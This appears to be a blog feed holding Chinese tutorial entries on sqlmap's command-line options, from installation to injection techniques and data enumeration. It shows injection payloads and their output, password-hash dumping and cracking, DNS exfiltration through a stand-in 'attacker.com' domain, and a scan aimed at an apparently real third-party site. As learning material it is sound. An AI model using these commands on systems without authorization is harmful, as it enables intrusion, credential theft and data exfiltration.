blind（基于时间延迟注入）Q：Inline queries（嵌套查询注入）</code></pre><p>可以用“–technique ES”来指定使用两种检测技术。“–technique BEUSTQ”与默认情况等效。<br>想要访问文件系统或是Windows的注册表就一定要添加“S”进行多语句查询注入测试。</p><p><strong><em>2.基于时间延迟注入中延时设置</em></strong><br><strong>参数：–time-sec</strong><br>用此参数设置基于时间延迟注入中延时时长，默认为5秒。</p><p><strong><em>3.联合查询注入中列数设置</em></strong><br><strong>参数：–union-cols</strong><br>在进行联合查询注入时，Sqlmap会自动检测列数，范围是1到10。当level值较高时列数检测范围的上限会扩大到50。<br>可以用此参数指定列数检测范围，如“–union-cols 12-16”就会让Sqlmap的列数检测范围变成12到16。</p><p><strong><em>4.联合查询注入中字符设置</em></strong><br><strong>参数：–union-char</strong><br>默认情况下Sqlmap进行联合查询注入时使用空字符（NULL）。但当level值较高时Sqlmap会生成随机数用于联合查询注入。<br>因为有时使用空字符注入会失败而使用随机数会成功。</p><p>使用此参数可以指定联合查询注入中使用的字符，如：“–union-char 123”。</p><p>“联合查询注入中使用的字符”究竟是什么意思呢？请看下面两个例子：</p><p>第一个例子，不使用“–union-char”，默认情况下联合查询注入中使用的字符为空字符（NULL）：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.56.101/user.php?id=001"</span> --technique U -v 3</span><br></pre></td></tr></table></figure></p><p>部分输出为：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[10:59:15] [PAYLOAD] 001 UNION ALL SELECT NULL,CONCAT(0x71707a6271,0x66546c7770497458576f6455476761654654745744684c5062585971794c556d55454a6c49525675,0x7162767671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- FAcV</span><br><span class="line">[10:59:15] [PAYLOAD] 001 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71707a6271,0x6b43674e76687959526b6452627255787373675a6f5a436f7266756d49424547496d506779456170,0x7162767671),NULL,NULL,NULL,NULL,NULL-- caXD</span><br></pre></td></tr></table></figure></p><p>第一个例子，使用“–union-char 123”，指定联合查询注入中使用的字符为“123”：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.56.101/user.php?id=001"</span> --technique U -v 3 --union-char 123</span><br></pre></td></tr></table></figure></p><p>部分输出为：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[10:59:30] [PAYLOAD] 001 UNION ALL SELECT 123,123,123,123,123,123,123,123,123,123,123,CONCAT(0x716b707171,0x776c71686e54726659424b49616d68756e64734d45774c4c7163494345794255784557597a484244,0x7178627071)-- aUXO</span><br><span class="line">[10:59:30] [PAYLOAD] 001 UNION ALL SELECT 123,123,123,123,123,123,123,123,123,123,CONCAT(0x716b707171,0x6f5278444767675156496c724563714e6568634c6b5950646a6f4e53516b776d77474e7141425273,0x7178627071),123-- lPHb</span><br></pre></td></tr></table></figure></p><p>仔细观察上示两例的输出就能明白“联合查询注入中使用的字符”就是“UNION ALL SELECT XXX, XXX”中的“XXX”。</p><p><strong><em>5.联合查询注入中表名设置</em></strong><br><strong>参数：–union-from</strong><br>有些情况下在联合查询中必须指定一个有效和可访问的表名，否则联合查询会执行失败，如在微软的Access中。<br>（也就是说，某些DBMS不支持“SELECT 1,2;”这样的语句，SELECT必须有FROM。）<br>用此参数指定这个表名，如：“–union-from=users”。</p><p><strong><em>6.DNS泄露攻击</em></strong><br><strong>参数：–dns-domain</strong><br>SQL注入中的DNS泄露攻击详情见论文《Data Retrieval over DNS in SQL Injection Attacks》。</p><p>假设攻击者控制着某域名（例如：attacker.com）的域名解析服务器，即查询该域名的子域名对应的IP地址都会到这台域名解析服务器来查询。<br>这时攻击者就可以使用“–dns-domain attacker.com”来进行DNS泄露攻击。</p><p>实际上若是攻击者没有控制任何一台域名解析服务器，那么她可以注册一个新域名，再自己搭建一台域名解析服务器用于接受数据。</p><p><strong><em>7.二阶注入攻击</em></strong><br><strong>参数：–second-order</strong><br>有时注入结果显示在别的页面，此时需要用此参数指明显示注入结果的页面，该参数后跟一个URL。</p><h3 id="0x0A-指纹"><a href="#0x0A-指纹" class="headerlink" title="0x0A 指纹"></a>0x0A 指纹</h3><p>默认地Sqlmap会自动对注入目标进行数据库管理系统指纹识别。<br><strong>参数：-f或–fingerprint</strong><br>若想执行更广泛的数据库管理系统指纹识别可以添加此参数。</p><p><strong>参数：-b或–banner</strong><br>若想得到更精确的指纹识别结果可以添加此参数，详情见后文。</p><h3 id="0x0B-暴力破解"><a href="#0x0B-暴力破解" class="headerlink" title="0x0B 暴力破解"></a>0x0B 暴力破解</h3><p><strong><em>1.暴力破解表名</em></strong><br><strong>参数：–common-tables</strong><br>有些情况下用“–tables”不能列出数据库中表名来，如：</p><pre><code>版本小于5.0的MySQL没有information_schema表微软Access的MSysObjects表默认不可读数据库用户权限过低无法读取表名</code></pre><p>当无法读出表名时可以使用参数“–common-tables”暴力破解表名，<br>该参数使用的字典是txt/common-tables.txt，其中存储了常见表名，可以手动编辑该文件。</p><p><strong><em>2.暴力破解列名</em></strong><br><strong>参数：–common-columns</strong><br>有些情况下用“–columns”不能列出数据表中列名来，如：</p><pre><code>版本小于5.0的MySQL没有information_schema表微软Access的MSysObjects表默认不可读数据库用户权限过低无法读取列名</code></pre><p>当无法读出列名时可以使用参数“–common-columns”暴力破解列名，<br>该参数使用的字典是txt/common-columns.txt，其中存储了常见列名，可以手动编辑该文件。</p><h3 id="0x0C-列举数据"><a href="#0x0C-列举数据" class="headerlink" title="0x0C 列举数据"></a>0x0C 列举数据</h3><p>这些参数用于列举出数据库管理系统信息、数据结构和数据内容。<br><strong><em>1.一键列举全部数据</em></strong><br><strong>参数：–all</strong><br>使用这一个参数就能列举所有可访问的数据。但不推荐使用，因为这会发送大量请求，把有用和无用的信息都列举出来。</p><p><strong><em>2.列举数据库管理系统信息</em></strong><br><strong>参数：-b或–banner</strong><br>大多数的现代数据库管理系统都有一个函数或是环境变量能够返回数据库管理系统的版本号和最后的补丁级别以及底层的操作系统信息。<br>通常这个函数是version()、环境变量是@@version，当然要看目标数据库管理系统了。使用参数“-b”或“–banner”来列举数据库管理系统的这一信息。</p><p>下例中的数据库是Oracle：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/oracle/get_int.php?id=1"</span> --banner</span><br></pre></td></tr></table></figure></p><p>部分输出为：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[09:54:30] [INFO] fetching banner</span><br><span class="line">web application technology: PHP 5.2.6, Apache 2.2.9</span><br><span class="line">back-end DBMS: Oracle</span><br><span class="line">banner: <span class="hljs-string">'Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod'</span></span><br></pre></td></tr></table></figure></p><p>下例中的数据库是Mysql：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.56.102/user.php?id=1"</span> --banner</span><br></pre></td></tr></table></figure></p><p>部分输出为：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[09:56:32] [INFO] fetching banner</span><br><span class="line">back-end DBMS operating system: Linux Ubuntu</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0</span><br><span class="line">banner:    <span class="hljs-string">'5.5.50-0ubuntu0.14.04.1'</span></span><br></pre></td></tr></table></figure></p><p><strong><em>3.列举当前用户</em></strong><br><strong>参数：–current-user</strong><br>使用这一参数有可能将执行SQL语句的用户列举出来。</p><p><strong><em>4.列举当前数据库</em></strong><br><strong>参数：–current-db</strong><br>使用这一参数有可能将WEB应用连接的数据库名列举出来。</p><p><strong><em>5.列举服务器主机名</em></strong><br><strong>参数：–hostname</strong><br>使用这一参数有可能将数据库管理系统所在计算机的主机名列举出来，如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/mysql/get_int.php?id=1"</span> --hostname</span><br></pre></td></tr></table></figure></p><p>部分输出如下：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:04] [INFO] fetching server hostname</span><br><span class="line">[xx:xx:04] [INFO] retrieved: debian-5.0-i386</span><br><span class="line">hostname: <span class="hljs-string">'debian-5.0-i386'</span></span><br></pre></td></tr></table></figure></p><p><strong><em>6.检测当前用户是否是管理员</em></strong><br><strong>参数：–is-dba</strong><br>使用这一参数有可能能够检测当前用户是否是管理员，若是管理员则返回True，否则返回False。如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.56.102/user.php?id=1"</span> --is-dba</span><br></pre></td></tr></table></figure></p><p>部分输出为：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[10:05:16] [INFO] testing <span class="hljs-keyword">if</span> current user is DBA</span><br><span class="line">[10:05:16] [INFO] fetching current user</span><br><span class="line">[10:05:16] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">current user is DBA:    True</span><br></pre></td></tr></table></figure></p><p><strong><em>7.列举数据库管理系统中的用户</em></strong><br><strong>参数：–users</strong><br>当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中的用户。</p><p><strong><em>8.列举并破解数据库管理系统用户密码Hash值</em></strong><br><strong>参数：–passwords</strong><br>当前用户有读取包含了数据库管理系统中用户密码Hash值的系统表的权限时使用这一参数可以列举数据库管理系统中用户密码Hash值。<br>Sqlmap会先列举用户，再列举用户密码Hash值。</p><p>下面是一个以PostgreSQL为目标的例子：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1"</span> --passwords -v 1</span><br></pre></td></tr></table></figure></p><p>部分输出如下所示：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">back-end DBMS: PostgreSQL</span><br><span class="line">[hh:mm:38] [INFO] fetching database users password hashes</span><br><span class="line"><span class="hljs-keyword">do</span> you want to use dictionary attack on retrieved password hashes? [Y/n/q] y</span><br><span class="line">[hh:mm:42] [INFO] using <span class="hljs-built_in">hash</span> method: <span class="hljs-string">'postgres_passwd'</span></span><br><span class="line">what<span class="hljs-string">'s the dictionary'</span>s location? [/software/sqlmap/txt/wordlist.txt]</span><br><span class="line">[hh:mm:46] [INFO] loading dictionary from: <span class="hljs-string">'/software/sqlmap/txt/wordlist.txt'</span></span><br><span class="line"><span class="hljs-keyword">do</span> you want to use common password suffixes? (slow!) [y/N] n</span><br><span class="line">[hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)</span><br><span class="line">[hh:mm:49] [INFO] found: <span class="hljs-string">'testpass'</span> <span class="hljs-keyword">for</span> user: <span class="hljs-string">'testuser'</span></span><br><span class="line">[hh:mm:50] [INFO] found: <span class="hljs-string">'testpass'</span> <span class="hljs-keyword">for</span> user: <span class="hljs-string">'postgres'</span></span><br><span class="line">database management system users password hashes:</span><br><span class="line">[*] postgres [1]:</span><br><span class="line">  password <span class="hljs-built_in">hash</span>: md5d7d880f96044b72d0bba108ace96d1e4</span><br><span class="line">  clear-text password: testpass</span><br><span class="line">[*] testuser [1]:</span><br><span class="line">  password <span class="hljs-built_in">hash</span>: md599e5ea7a6f7c3269995cba3927fd0093</span><br><span class="line">  clear-text password: testpass</span><br></pre></td></tr></table></figure></p><p>Sqlmap不仅会列举出密码Hash，还会解析密码Hash格式，并询问用户是否要通过密码字典的方式破解Hash值寻找出明文密码。</p><p>若想只枚举特定用户的密码使用参数“-U”指定用户，可用“CU”来代表当前用户，如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.56.102/user.php?id=1"</span> --password -U CU</span><br></pre></td></tr></table></figure></p><p>部分输出如下：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">database management system users password hashes:</span><br><span class="line">[*] root [1]:</span><br><span class="line">    password <span class="hljs-built_in">hash</span>: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br><span class="line">    clear-text password: root</span><br></pre></td></tr></table></figure></p><p><strong><em>9.列举数据库管理系统的用户权限</em></strong><br><strong>参数：–privileges</strong><br>当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中用户的权限。通过用户权限可以判断哪些用户是管理员。</p><p>若想只枚举特定用户的权限使用参数“-U”指定用户，可用“CU”来代表当前用户。</p><p>若目标是微软的SQL Server，这一参数会列出每个用户是否是管理员而不列出每个用户的具体权限。</p><p><strong><em>10.列举数据库管理系统的用户角色</em></strong><br><strong>参数：–roles</strong><br>当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中用户的角色。</p><p>若想只枚举特定用户的角色使用参数“-U”指定用户，可用“CU”来代表当前用户。</p><p>官方手册上说只有目标数据库管理系统是Oracle时这一功能才可用，但我在Mysql中测试也是可用的。</p><p><strong><em>11.列举数据库管理系统中的所有数据库</em></strong><br><strong>参数：–dbs</strong><br>当前用户有读取包含了数据库管理系统中可用数据库信息的系统表的权限时使用这一参数可以列举数据库管理系统中所有数据库。</p><p><strong><em>12.列举数据库数据库的所有表</em></strong><br><strong>参数：–tables、–exclude-sysdbs和-D</strong><br>当前用户有读取包含了数据库管理系统中可用数据库中数据表信息的系统表的权限时使用参数“–tables”可以列举用参数“-D”指定的数据库中的所有数据表。<br>若没有用参数“-D”指定数据库，只使用参数“–tables”会列举所有数据库中所有表。如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.56.102/user.php?id=1"</span> -D DBName --tables</span><br></pre></td></tr></table></figure></p><p>使用参数“–exclude-sysdbs”可排除系统数据库。在Oracle中要指定TABLESPACE_NAME而不是数据库名。<br><strong><em>13.列举数据表的所有列</em></strong><br><strong>参数：–columns、-C、-T和-D</strong><br>如权限允许，使用参数“–columns”可以列出用“-D”指定的数据库中用“-T”指定的表中的所有列的名字和数据类型。<br>若没有指定数据库则会默认使用当前数据库。还可以用“-C”指定感兴趣的某几列这样就不用列出所有列来。</p><p>下面是以SQLite为目标的例子：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1"</span> --columns -D testdb -T users</span><br></pre></td></tr></table></figure></p><p>部分输出如下：<br><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Database: SQLite_masterdb</span><br><span class="line">Table: users</span><br><span class="line">[3 columns]</span><br><span class="line">+<span class="hljs-comment">---------+---------+</span></span><br><span class="line">| Column | Type     |</span><br><span class="line">+<span class="hljs-comment">---------+---------+</span></span><br><span class="line">| id      | INTEGER |</span><br><span class="line">| name    | TEXT    |</span><br><span class="line">| surname | TEXT    |</span><br><span class="line">+<span class="hljs-comment">---------+---------+</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;#87CEFF&quot; size=&quot;2&quot;&gt;我近来时时感到，很需要到一处完全听不见电车、火车声响的地方，好好睡一睡，想一想，哪怕只是一天也好。为此，我有了旅行的欲望。  ——谷崎润一郎《阴翳礼赞》 &lt;/font&gt;
&lt;/blockquote&gt;
&lt;p&gt;接上一篇&lt;a href=&quot;https://www.f4guo.top/2019/03/22/Sqlmap%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%88%E5%85%B6%E4%B8%80%EF%BC%89&quot;&gt;Sqlmap命令行（其一）&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x08-检测&quot;&gt;&lt;a href=&quot;#0x08-检测&quot; class=&quot;headerlink&quot; title=&quot;0x08 检测&quot;&gt;&lt;/a&gt;0x08 检测&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;1.检测级别&lt;/em&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;参数：–level&lt;/strong&gt;&lt;br&gt;此参数用于指定检测级别，有1~5共5级。默认为1，表示做最少的检测，相应的，5级表示做最多的检测。&lt;br&gt;Sqlmap使用的payload保存在目录xml/payloads/中，是xml格式的，可以自己定制。节选一个payload如下所示：&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.f4guo.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="工具手册" scheme="http://www.f4guo.top/tags/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"/>
    
  </entry>
  
  <entry>
    <title>Sqlmap命令行（其一）</title>
    <link href="http://www.f4guo.top/2019/03/22/Sqlmap%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%88%E5%85%B6%E4%B8%80%EF%BC%89/"/>
    <id>http://www.f4guo.top/2019/03/22/Sqlmap命令行（其一）/</id>
    <published>2019-03-22T09:01:57.000Z</published>
    <updated>2019-03-25T15:10:42.622Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="#87CEFF" size="2">人对于周围的失去看得是多么不清楚，常常必得从远方来一个人告诉我们周围的真面目。所以人必须把万物从自己身边推开，以便后来善于取用较为正确而平静的方式，以稀少的亲切和敬畏的距离来同他们接近。  ——里克尔《给青年诗人的信》 </font></blockquote><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>本文转载自werner-wiki的博客，便于参考学习（侵权删）原文地址：<a href="https://blog.csdn.net/wn314/article/details/78872828。" target="_blank" rel="noopener">https://blog.csdn.net/wn314/article/details/78872828。</a></p><h3 id="0x01-Sqlmap是什么"><a href="#0x01-Sqlmap是什么" class="headerlink" title="0x01 Sqlmap是什么"></a>0x01 Sqlmap是什么</h3><p>Sqlmap是开源的自动化SQL注入工具，由Python写成，具有如下特点：</p><pre><code>完全支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB和Informix等多种数据库管理系统。完全支持布尔型盲注、时间型盲注、基于错误信息的注入、联合查询注入和堆查询注入。在数据库证书、IP地址、端口和数据库名等条件允许的情况下支持不通过SQL注入点而直接连接数据库。支持枚举用户、密码、哈希、权限、角色、数据库、数据表和列。支持自动识别密码哈希格式并通过字典破解密码哈希。支持完全地下载某个数据库中的某个表，也可以只下载某个表中的某几列，甚至只下载某一列中的部分数据，这完全取决于用户的选择。支持在数据库管理系统中搜索指定的数据库名、表名或列名当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持下载或上传文件。当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持执行任意命令并回现标准输出。</code></pre><a id="more"></a><h3 id="0x02-Sqlmap安装"><a href="#0x02-Sqlmap安装" class="headerlink" title="0x02 Sqlmap安装"></a>0x02 Sqlmap安装</h3><p>Sqlmap的开源项目，托管在github，最简单的安装方式便是使用git，执行如下命令：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="hljs-built_in">clone</span> https://github.com/sqlmapproject/sqlmap.git</span><br></pre></td></tr></table></figure></p><p>片刻后命令执行完毕，可以看到当前目录中多了一个名为“sqlmap”的目录，<br>该目录中保存着Sqlmap的Python源码、配置文件和文档。<br>由于Python是解释执行的语言，不用编译，所以至此最新版的Sqlmap已经安装完成。<br>cd到“sqlmap”目录中，用命令“python sqlmap”启动Sqlmap，如下图所示：<br><img src="/images/paperimage/sqlmap_s.png" alt=""><br>Sqlmap安装完成,当想要更新Sqlmap时，进入到“sqlmap”目录中执行命令“git pull”即可。</p><h3 id="0x03-输出级别-Output-verbosity"><a href="#0x03-输出级别-Output-verbosity" class="headerlink" title="0x03 输出级别(Output verbosity)"></a>0x03 输出级别(Output verbosity)</h3><p><strong>参数：-v</strong><br>Sqlmap的输出信息按从简到繁共分为7个级别（和葫芦娃一样多），依次为0、1、2、3、4、5和6。使用参数“-v &lt;级别&gt;”来指定某个等级，如使用参数“-v 6”来指定输出级别为6。默认输出级别为1。各个输出级别的描述如下：</p><pre><code>0：只显示Python的tracebacks信息、错误信息[ERROR]和关键信息[CRITICAL]；1：同时显示普通信息[INFO]和警告信息[WARNING]；2：同时显示调试信息[DEBUG]；3：同时显示注入使用的攻击荷载；4：同时显示HTTP请求；5：同时显示HTTP响应头；6：同时显示HTTP响应体。</code></pre><p>各个级别输出的信息详细到什么程度，还需要自己尝试下，亲眼见到，才会有明确的认识。</p><h3 id="0x04-指定目标"><a href="#0x04-指定目标" class="headerlink" title="0x04 指定目标"></a>0x04 指定目标</h3><p>Sqlmap运行时必须指定至少一个目标，支持一次指定多个目标。有以下几种指定目标的方式：</p><p><strong><em>1.直接连接数据库</em></strong><br><strong>参数：-d</strong><br>使用参数“-d”直接连接数据库，该参数后跟一个表示数据库的字符串，该字符串有以下两种格式：<br>(1).当数据库管理系统是MySQL、Oracle、Microsoft SQL Server或PostgreSQL等时格式为：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME</span><br></pre></td></tr></table></figure></p><p>(2).当数据库管理系统是SQLite、Microsoft Access或Firebird等时格式为：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DBMS://DATABASE_FILEPATH</span><br></pre></td></tr></table></figure></p><p>我用如下命令连接装在本机上的Mysql：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -d <span class="hljs-string">"mysql://root:root@127.0.0.1:3306/DISSchool"</span></span><br></pre></td></tr></table></figure></p><p>却出现了错误，错误为：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[CRITICAL] sqlmap requires <span class="hljs-string">'python-pymysql'</span> third-party library <span class="hljs-keyword">in</span> order to directly connect to the DBMS <span class="hljs-string">'MySQL'</span>. You can download it from <span class="hljs-string">'https://github.com/petehunt/PyMySQL/'</span>. Alternative is to use a package <span class="hljs-string">'python-sqlalchemy'</span> with support <span class="hljs-keyword">for</span> dialect <span class="hljs-string">'mysql'</span> installed</span><br></pre></td></tr></table></figure></p><p>意思是我没有安装Python连接Mysql用的第三方库python-pymysql。虽然我安装了python-mysqldb可以使Python连接Mysql，但显然Sqlmap使用的是python-pymysql而不是python-mysqldb。使用如下命令安装python-pymysql：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="hljs-built_in">clone</span> https://github.com/petehunt/PyMySQL/</span><br><span class="line"><span class="hljs-built_in">cd</span> PyMySQL/</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure></p><p>安装好python-pymysql后再执行命令：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -d <span class="hljs-string">"mysql://root:root@127.0.0.1:3306/DISSchool"</span></span><br></pre></td></tr></table></figure></p><p>这次没有报错，成功的连接到了数据库。只是除了检测数据库确实是Mysql版本号大于等于5.0.0之外便什么都没有做。让Sqlmap做点什么需要用其他参数指定，这些参数我们稍晚些再学习。</p><p><strong><em>2.指定目标URL</em></strong><br><strong>参数：-u 或 –url</strong><br>使用参数“-u”或“–url”指定一个URL作为目标，该参数后跟一个表示URL的字符串，可以是http协议也可以是https协议，还可以指定端口，如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.56.102:8080/user.php?id=0"</span></span><br></pre></td></tr></table></figure></p><p><strong><em>3.从Burp或WebScarab的代理日志中解析目标</em></strong><br><strong>参数：-l</strong><br>使用参数“-l”指定一个Burp或WebScarab的代理日志文件，Sqlmap将从日志文件中解析出可能的攻击目标，并逐个尝试进行注入。该参数后跟一个表示日志文件的路径。<br>WebScarab我没有用过，Burp倒是常常会用。Burp默认不记录日志，想要记录日志需要手动开启，设置方法如下图所示：<br>![设置Burp日志]<br>只用勾选代理中的请求数据就足够了，日志文件路径可随意设置，这里我设置日志文件名为proxy.log，放在用户主目录中。<br>设置浏览器的代理为Burp，随便浏览几个网页后发现proxy.log竟然已经有70多K大，查看其内容，部分输出如下：</p><pre><code>werner@Yasser:~$ more proxy.log======================================================7:22:52 PM  http://ocsp.digicert.com:80  [117.18.237.29]======================================================POST / HTTP/1.1Host: ocsp.digicert.comUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-SG,en-US;q=0.7,en;q=0.3Accept-Encoding: gzip, deflateContent-Length: 83Content-Type: application/ocsp-requestDNT: 1Connection: close0Q0O0M0K0I0   +�ǝ��Pr�Tz�============================================================================================================7:23:00 PM  http://blog.csdn.net:80  [47.95.49.160]======================================================GET /pyufftj/article/details/21469201 HTTP/1.1Host: blog.csdn.netUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8...</code></pre><p>可以看到该日志文件不仅记录了GET参数，还记录了cookie和POST参数。现在使用如下命令让Sqlmap解析该日志文件，自动寻找目标，检测注入漏洞：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -l ../proxy.log</span><br></pre></td></tr></table></figure></p><p>注意日志文件的路径要写正确。执行该命令时，每找到一个可能的攻击目标，Sqlmap都会询问是否要检测该目标。，默认回答为“Y”，想要测试该目标，直接按回车键就行。<br>当日志较大时会有很多可能目标，虽然有询问机制但依旧麻烦，因为不能一路按回车而要进行判断。若是可以对日志进行过滤就好了！确实是可以的，参数为“–scope”，详情见“五.18”。</p><p><strong><em>4.从站点地图文件中解析目标</em></strong><br><strong>参数：-x</strong><br>为便于搜索引擎收录，许多网站专门为搜索引擎生成了xml格式的站点地图，如百度Sitemap支持xml格式。Sqlmap可以直接解析xml格式的站点地图，从中提取攻击目标，对一个网站全方位无死角地进行注入检测，此时使用的参数是“-x”，如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -x http://www.6eat.com/sitemap.xml</span><br></pre></td></tr></table></figure></p><p>但执行该命令的结果却是：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[WARNING] no usable links found (with GET 